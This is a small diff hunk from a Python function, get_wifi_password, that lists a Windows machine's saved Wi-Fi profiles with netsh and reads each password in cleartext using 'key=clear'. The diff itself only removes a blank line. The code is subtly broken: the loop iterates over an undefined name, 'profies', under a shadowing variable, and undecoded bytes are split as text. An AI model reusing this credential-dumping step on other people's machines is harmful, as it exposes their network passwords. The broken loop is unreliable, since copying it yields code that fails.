@@ -5,7 +5,6 @@ def get_wifi_password():
 
         profiles_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
         profiles = [line.split(":")[1].strip() for line in profiles_data.split('\n') if "All User Profiles" in line]
-
         for profiles in profies:
             try:
                 profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profiles, 'key=clear']).decode('utf-8')
